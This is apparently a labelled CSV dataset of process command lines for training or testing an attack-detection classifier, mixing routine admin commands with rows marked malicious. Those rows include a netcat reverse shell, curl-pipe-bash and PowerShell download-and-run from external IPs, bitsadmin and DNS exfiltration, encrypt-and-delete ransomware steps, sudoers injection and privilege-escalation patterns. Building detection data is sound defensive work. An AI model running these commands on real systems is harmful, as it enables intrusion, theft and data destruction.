process_name,command_line,label,attack_type
7z,7z a -mx=9 -ms=on /srv/backups/archive/snapshot-6.27.0.7z /var/lib/app/customer/exports -xr!node_modules,benign,ransomware
rsync,rsync -aHAX --delete --partial /var/lib/app/customer/exports/ /srv/backups/incremental/svc09/,benign,ransomware
powershell.exe,"powershell.exe -nop -w hidden -c ""Get-ChildItem C:\Users\mssql -Recurse -Include *.docx,*.xlsx | ForEach-Object { $_.FullName }""",malicious,ransomware
apt-get,apt-get install -y --no-install-recommends vendor-agent=3.32.1 && systemctl enable vendor-agent,benign,persistence
tar,tar czf - /usr/local/share/pipeline/artifacts/build | ssh -i /etc/ci/key backup@10.10.41.185 'cat > /srv/backups/payroll-2.33.4.tgz',benign,data_exfiltration
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\dataset_part /v Version /t REG_SZ /d 0.7.0 /f,benign,persistence
openssl,openssl enc -aes-256-cbc -salt -in /mnt/storage/shares/department/legal/ledger_2024.db -out /mnt/storage/shares/department/legal/ledger_2024.db.locked -k 42f5ddcc6152,malicious,ransomware
ssh,ssh -tt -i /etc/ci/deploy_key jenkins@app04.corp.local 'sudo systemctl restart audit_trail',benign,reverse_shell
fluent-bit,fluent-bit -i tail -p path=/var/log/audit_trail/*.log -o forward -p host=10.37.84.200 -p port=24224,benign,data_exfiltration
dpkg,dpkg -i /opt/packages/customer_db-7.19.9_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
dpkg,dpkg -i /opt/packages/telemetry_batch-6.25.6_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
powershell.exe,powershell.exe iex(New-Object Net.WebClient).DownloadString('http://91.35.52.171/d2edfd402035') (parent: sqlservr.exe),malicious,sql_exploitation
psexec.exe,psexec.exe \\cache10 -u CORP\ops -h -accepteula msiexec /i \\worker03\sccm$\packages\audit_trail-0.35.5.msi /qn,benign,lateral_movement
tar,tar czf - /opt/vendor/pkg/cache/objects | ssh -i /etc/ci/key backup@10.12.54.22 'cat > /srv/backups/dataset_part-2.36.9.tgz',benign,data_exfiltration
certutil.exe,certutil.exe -store My ee41c775de9e74106c5065e04f5cc20e,benign,credential_dumping
ansible-pull,"ansible-pull -U git@app02.prod.svc.cluster.local:ops/playbooks.git -i localhost, --vault-password-file /etc/ansible/vault.pass site.yml",benign,reverse_shell
dpkg,dpkg -i /opt/packages/telemetry_batch-1.32.7_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
chown,chown -R build:build /opt/app/releases/4.3.7 && chmod -R 750 /opt/app/releases/4.3.7,benign,privilege_escalation
powershell.exe,"powershell.exe Remove-EventLog -LogName ""Microsoft-Windows-WinRM/Operational""",malicious,defense_evasion
chown,chown -R ansible:ansible /opt/app/releases/8.22.5 && chmod -R 750 /opt/app/releases/8.22.5,benign,privilege_escalation
wget,wget -qO /tmp/.d2edfd402035 http://45.79.27.184/d2edfd402035 && /tmp/.d2edfd402035 (parent: mysqld),malicious,sql_exploitation
make,make -j34 all && make -j34 test (CI build farm node edge12),benign,crypto_miner
sqlpackage,sqlpackage /Action:Export /SourceServerName:build09 /SourceDatabaseName:payroll /TargetFile:X:\dac\payroll.bacpac (user: MSSQLSERVER),benign,sql_exploitation
dpkg,dpkg -i /opt/packages/manifest-5.31.8_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
chown,chown -R sysadmin:sysadmin /opt/app/releases/1.40.1 && chmod -R 750 /opt/app/releases/1.40.1,benign,privilege_escalation
rsync,rsync -az --partial --bwlimit=20000 /var/log/snapshot/ logsink@10.2.193.52:/data/logs/cache11/,benign,data_exfiltration
zfs,zfs snapshot tank/data/web02@nightly-1421,benign,ransomware
curl,curl -s -X POST --data-binary @/var/log/app/metrics.json http://10.13.92.137:9091/metrics/job/audit_trail -H 'Content-Type: application/json',benign,data_exfiltration
fluent-bit,fluent-bit -i tail -p path=/var/log/audit_trail/*.log -o forward -p host=10.15.87.205 -p port=24224,benign,data_exfiltration
crackmapexec,crackmapexec smb 10.16.102.142/24 -u jenkins -p dc7e2705c8a8e520 -x 'whoami',malicious,lateral_movement
chown,chown -R postgres:postgres /opt/app/releases/8.2.9 && chmod -R 750 /opt/app/releases/8.2.9,benign,privilege_escalation
dpkg,dpkg -i /opt/packages/dataset_part-0.22.3_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
nslookup,for f in $(ls C:\ProgramData\Vendor\Telemetry\spool); do nslookup $(echo $f|base64).3ce17a428c81732668fc510497f4a53f.5.52.208.49; done,malicious,data_exfiltration
tmux,"tmux new-session -d -s deploy 'ssh build@svc08 ""journalctl -u session_blob -f""'",benign,reverse_shell
ldapsearch,"ldapsearch -x -H ldap://app11.internal.acme.io -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-7.9.2.wfw,benign,defense_evasion
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\worker02\sccm$\customer_db-3.30.8.msi /qn""",benign,privilege_escalation
curl,curl -s -T /srv/reports/snapshot-9.13.4.pdf -u svc_report:$RPT_TOKEN https://reports.eng.example.net/api/v2/upload,benign,data_exfiltration
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\db01\sccm$\archive_set-9.0.1.msi /qn""",benign,privilege_escalation
dpkg,dpkg -i /opt/packages/snapshot-0.24.7_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
gpupdate.exe,gpupdate.exe /force && gpresult /h C:\Logs\gpresult-worker03.html,benign,defense_evasion
sshd,sshd --algo rx/0 -o 91.225.121.70:5985 -u 0c2273ecfd564271 --background --max-cpu-usage 90 (masquerade),malicious,crypto_miner
cron,echo '*/15 * * * * sysadmin /opt/monitoring/collect-metrics.sh --push gateway://10.3.253.182:9091' > /etc/cron.d/metrics,benign,persistence
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\ci05\sccm$\report_final-7.15.8.msi /qn""",benign,privilege_escalation
ufw,ufw allow from 10.24.194.38/24 to any port 1337 proto tcp comment 'app cluster 2.37.3',benign,defense_evasion
blender,blender -b /srv/render/payroll.blend -o /srv/render/out/ -F PNG -x 1 -f 26 -- --cycles-device CPU,benign,crypto_miner
dirtypipe,/tmp/.1308db3cbdd2aeb146c2de5211a697e4/exploit /etc/passwd 1 'root:...' (CVE-2022-0847 pattern),malicious,privilege_escalation
chown,chown -R www-data:www-data /opt/app/releases/1.35.4 && chmod -R 750 /opt/app/releases/1.35.4,benign,privilege_escalation
ffmpeg,ffmpeg -i /srv/media/session_blob.mov -c:v libx264 -preset slow -crf 18 -threads 2 /srv/media/out/session_blob.mp4,benign,crypto_miner
pg_dump,pg_dump -h 10.15.154.15 -U postgres -Fc -j 4 -f /srv/backups/db/ledger_2024-8.40.0.dump analytics (user: postgres),benign,sql_exploitation
stress-ng,stress-ng --cpu 25 --cpu-method matrixprod --timeout 600s --metrics-brief,benign,crypto_miner
cron,echo '*/15 * * * * mssql /opt/monitoring/collect-metrics.sh --push gateway://10.22.60.119:9091' > /etc/cron.d/metrics,benign,persistence
blender,blender -b /srv/render/ledger_2024.blend -o /srv/render/out/ -F PNG -x 1 -f 3 -- --cycles-device CPU,benign,crypto_miner
sc.exe,sc.exe config TermService start= auto (corporate baseline GPO 12d013e1af67),benign,defense_evasion
chown,chown -R postgres:postgres /opt/app/releases/7.3.6 && chmod -R 750 /opt/app/releases/7.3.6,benign,privilege_escalation
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\snapshot /v Version /t REG_SZ /d 0.15.7 /f,benign,persistence
sqlcmd,sqlcmd -S 10.22.21.112 -E -i C:\Maintenance\reindex-archive_set.sql -o C:\Logs\reindex-4.log (user: MSSQLSERVER),benign,sql_exploitation
psql,psql -h 10.13.186.29 -U postgres -c 'REINDEX DATABASE warehouse' -q (user: postgres),benign,sql_exploitation
tar,tar czf - C:\Users\svc_backup\AppData\Local\Temp\cache | ssh -i /etc/ci/key backup@10.22.21.112 'cat > /srv/backups/audit_trail-1.5.8.tgz',benign,data_exfiltration
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\audit_trail /v Version /t REG_SZ /d 2.35.1 /f,benign,persistence
robocopy,robocopy /srv/data/projects/2024 \\node12\backups$\snapshot /MIR /Z /R:3 /W:5 /LOG:C:\Logs\backup-41.log,benign,ransomware
tar,tar czf - /usr/local/share/pipeline/artifacts/build | ssh -i /etc/ci/key backup@10.39.141.197 'cat > /srv/backups/manifest-1.9.3.tgz',benign,data_exfiltration
make,make -j28 all && make -j28 test (CI build farm node ci11),benign,crypto_miner
sc.exe,sc.exe config EventLog start= auto (corporate baseline GPO a62bf3f5f5762ed3),benign,defense_evasion
scp,scp -C -i /etc/ci/key /srv/backups/db/manifest-9.39.2.dump backup@build11.internal.acme.io:/srv/offsite/,benign,data_exfiltration
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\f2116ac93be7f970fc8ee527cc37ab89 -FilePath C:\Backups\certs\ledger_2024.cer,benign,credential_dumping
gpg,gpg --export-secret-keys --armor backups@internal.acme.io > /srv/backups/keys/telemetry_batch.asc,benign,credential_dumping
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-2.31.3.wfw,benign,defense_evasion
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 8.7.0"" dir=in action=allow protocol=TCP localport=8443",benign,defense_evasion
at.exe,at.exe \\10.4.22.20 13:00 cmd /c \\db01\C$\Windows\Temp\e5d726d56382ed9d1fd196202cec9bba.bat,malicious,lateral_movement
mysqldump,mysqldump --single-transaction --routines --triggers -u svc_backup -p$DB_PASS billing > /srv/backups/ledger_2024.sql,benign,credential_dumping
openssl,openssl dgst -sha256 -out /srv/backups/report_final.sha256 /home/postgres/Documents/Finance/Q4/report_final.tar.gz,benign,ransomware
python3,python3 -m http.server 8080 --directory /srv/artifacts/session_blob --bind 10.39.170.112,benign,reverse_shell
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\snapshot /v Version /t REG_SZ /d 9.32.0 /f,benign,persistence
cmd.exe,"cmd.exe /c ""sc qc BITS"" & copy C:\Temp\9fc189a05a3a1426f6bd57670b5fa393.exe ""C:\Program Files\Vendor\Common.exe"" (unquoted path abuse)",malicious,privilege_escalation
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\payroll /v Version /t REG_SZ /d 2.15.0 /f,benign,persistence
sqlcmd,sqlcmd -S 10.2.157.219 -E -i C:\Maintenance\reindex-ledger_2024.sql -o C:\Logs\reindex-94.log (user: MSSQLSERVER),benign,sql_exploitation
sqlpackage,sqlpackage /Action:Export /SourceServerName:svc10 /SourceDatabaseName:manifest /TargetFile:X:\dac\manifest.bacpac (user: MSSQLSERVER),benign,sql_exploitation
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\node08\sccm$\manifest-4.0.2.msi /qn""",benign,privilege_escalation
nc,nc -z -w2 10.15.87.205 5986 && echo 'port 5986 open on 10.15.87.205',benign,reverse_shell
borg,"borg create --stats --compression zstd,9 /mnt/backup::design_spec-4-18 /usr/local/share/pipeline/artifacts/build",benign,ransomware
nc,nc -z -w2 10.5.235.179 8080 && echo 'port 8080 open on 10.5.235.179',benign,reverse_shell
7z,7z a -mx=9 -ms=on /srv/backups/archive/dataset_part-5.6.1.7z /usr/local/share/pipeline/artifacts/build -xr!node_modules,benign,ransomware
gzip,tar c /var/lib/app/customer/exports | gzip -9 | wc -c (compression ratio QA check),benign,crypto_miner
apt-get,apt-get install -y --no-install-recommends vendor-agent=9.5.9 && systemctl enable vendor-agent,benign,persistence
dpkg,dpkg -i /opt/packages/payroll-3.25.8_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
ffmpeg,ffmpeg -i /srv/media/archive_set.mov -c:v libx264 -preset slow -crf 18 -threads 60 /srv/media/out/archive_set.mp4,benign,crypto_miner
sqlpackage,sqlpackage /Action:Export /SourceServerName:web07 /SourceDatabaseName:session_blob /TargetFile:X:\dac\session_blob.bacpac (user: MSSQLSERVER),benign,sql_exploitation
salt,"salt 'svc06*' state.apply webserver pillar='{""release"": ""6.27.5""}'",benign,lateral_movement
bitsadmin.exe,bitsadmin.exe /transfer x /upload http://185.1.240.208/u C:\Temp\f618aff0cea38922.zip,malicious,data_exfiltration
ufw,ufw allow from 10.12.83.62/24 to any port 4444 proto tcp comment 'app cluster 1.37.8',benign,defense_evasion
aws,aws s3 sync /srv/backups/db s3://acme-backups-eu/snapshot/4.0.2/ --storage-class STANDARD_IA --only-show-errors,benign,data_exfiltration
bash,"bash -c ""systemctl --user enable ledger_2024.service && loginctl enable-linger automation""",benign,persistence
docker,docker exec -it report_final-6ef42433de1c2b0d1c1c7da88a6e154a /bin/bash -lc 'tail -f /var/log/app/current',benign,reverse_shell
gpg,gpg --batch --yes --recipient backups@eng.example.net -e -o /srv/backups/customer_db.gpg /home/sysadmin/Documents/Finance/Q2/customer_db.tar,benign,ransomware
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance web03 -Database customer_db -BackupFile 'X:\backups\customer_db-9.31.0.bak' (user: MSSQLSERVER),benign,sql_exploitation
nc,nc -e /bin/bash 193.49.23.249 8443,malicious,reverse_shell
pkexec,pkexec --version; GCONV_PATH=/tmp/.2ff8134dc12fbbc45615e8e2628cbd84 pkexec /bin/sh (pwnkit pattern),malicious,privilege_escalation
gpg,gpg --export-secret-keys --armor backups@ad.example.com > /srv/backups/keys/snapshot.asc,benign,credential_dumping
bash,"bash -c 'id; uname -a; curl -s http://91.211.68.100/257a33d245a1|bash' (parent: postgres, COPY TO PROGRAM)",malicious,sql_exploitation
apt-get,apt-get install -y --no-install-recommends vendor-agent=5.27.0 && systemctl enable vendor-agent,benign,persistence
ffmpeg,ffmpeg -i /srv/media/design_spec.mov -c:v libx264 -preset slow -crf 18 -threads 44 /srv/media/out/design_spec.mp4,benign,crypto_miner
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\payroll /v Version /t REG_SZ /d 4.26.1 /f,benign,persistence
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source /opt/vendor/pkg/cache/objects -Dest \\ci04\backups$ -Retain 54,benign,ransomware
ora_backup,rman target / cmdfile=/opt/oracle/scripts/backup-session_blob.rman log=/var/log/rman-56.log (user: oracle),benign,sql_exploitation
findstr,findstr /si password C:\Users\admin\*.config C:\Users\admin\*.xml > C:\Temp\8ae097fc3b1078e9e50aec17f5f895f9.txt,malicious,credential_dumping
make,make -j54 all && make -j54 test (CI build farm node build03),benign,crypto_miner
chown,chown -R www-data:www-data /opt/app/releases/4.14.1 && chmod -R 750 /opt/app/releases/4.14.1,benign,privilege_escalation
pg_dump,pg_dump -h 10.29.10.46 -U postgres -Fc -j 4 -f /srv/backups/db/snapshot-4.39.1.dump analytics (user: postgres),benign,sql_exploitation
ssh,"ssh -i /etc/ci/deploy_key build@web06.ad.example.com 'sudo systemctl restart ledger_2024 && sudo journalctl -u ledger_2024 --since ""1 min ago""'",benign,lateral_movement
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 4.19.4"" dir=in action=allow protocol=TCP localport=5985",benign,defense_evasion
gpupdate.exe,gpupdate.exe /force && gpresult /h C:\Logs\gpresult-db08.html,benign,defense_evasion
salt,"salt 'app05*' state.apply webserver pillar='{""release"": ""6.1.4""}'",benign,lateral_movement
nc,nc -z -w2 10.15.154.15 8080 && echo 'port 8080 open on 10.15.154.15',benign,reverse_shell
restic,restic -r sftp:svc_backup@svc09.ad.example.com:/backups backup /srv/data/projects/2024 --tag nightly --exclude-caches,benign,ransomware
chown,chown -R ops:ops /opt/app/releases/2.14.8 && chmod -R 750 /opt/app/releases/2.14.8,benign,privilege_escalation
certutil.exe,certutil.exe -store My 3ce17a428c81732668fc510497f4a53f,benign,credential_dumping
openssl,openssl speed -multi 38 -seconds 30 aes-256-cbc sha256 rsa2048,benign,crypto_miner
sh,"sh -c 'echo ""automation ALL=(ALL) NOPASSWD:ALL"" >> /etc/sudoers.d/d2edfd402035'",malicious,privilege_escalation
powershell.exe,"powershell.exe ""(Get-Item C:\Temp\0d62ae13c4a57a5a9aadd380de4aac9b.exe).LastWriteTime=(Get-Date '2020-03-15')""",malicious,defense_evasion
apt-get,apt-get install -y --no-install-recommends vendor-agent=7.10.5 && systemctl enable vendor-agent,benign,persistence
certutil.exe,certutil.exe -store My c27f59820a224949,benign,credential_dumping
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 5.2.3"" dir=in action=allow protocol=TCP localport=1337",benign,defense_evasion
dpkg,dpkg -i /opt/packages/customer_db-5.1.7_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
tar,tar -czf /srv/backups/nightly/ledger_2024-5.17.2.tar.gz /srv/data/projects/2024 --exclude='*.tmp',benign,ransomware
cron,echo '*/15 * * * * automation /opt/monitoring/collect-metrics.sh --push gateway://10.29.10.46:9091' > /etc/cron.d/metrics,benign,persistence
7z,7z a -mx=9 -ms=on /srv/backups/archive/snapshot-0.23.5.7z /srv/data/projects/2024 -xr!node_modules,benign,ransomware
bash,"bash -c ""systemctl --user enable session_blob.service && loginctl enable-linger sysadmin""",benign,persistence
ffmpeg,ffmpeg -i /srv/media/session_blob.mov -c:v libx264 -preset slow -crf 18 -threads 64 /srv/media/out/session_blob.mp4,benign,crypto_miner
openssl,openssl pkcs12 -export -in /etc/ssl/design_spec.crt -inkey /etc/ssl/design_spec.key -out /srv/backups/certs/design_spec.pfx -passout pass:7d6c3777ab97,benign,credential_dumping
gpg,gpg --batch --yes --recipient backups@internal.acme.io -e -o /srv/backups/manifest.gpg /data/warehouse/staging/landing/raw/manifest.tar,benign,ransomware
aws,aws s3 sync /srv/backups/db s3://acme-backups-eu/session_blob/6.2.7/ --storage-class STANDARD_IA --only-show-errors,benign,data_exfiltration
sc.exe,sc.exe config TermService start= auto (corporate baseline GPO e9ac890f6b0d),benign,defense_evasion
tar,tar -czf /tmp/.1308db3cbdd2aeb146c2de5211a697e4/telemetry_batch.tar.gz /home/postgres/Documents --remove-files,malicious,ransomware
apt-get,apt-get install -y --no-install-recommends vendor-agent=8.5.7 && systemctl enable vendor-agent,benign,persistence
ffmpeg,ffmpeg -i /srv/media/payroll.mov -c:v libx264 -preset slow -crf 18 -threads 5 /srv/media/out/payroll.mp4,benign,crypto_miner
7z,7z a -pdfb024707c175857 -mhe=on -sdel /tmp/.dfb024707c175857/customer_db.7z /mnt/storage/shares/department/legal,malicious,ransomware
dpkg,dpkg -i /opt/packages/audit_trail-5.5.9_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\db11\sccm$\ledger_2024-4.36.5.msi /qn""",benign,privilege_escalation
pg_dump,pg_dump -h 10.27.129.42 -U automation -Fc -f /srv/backups/db/manifest-0.20.7.dump --no-password customers,benign,credential_dumping
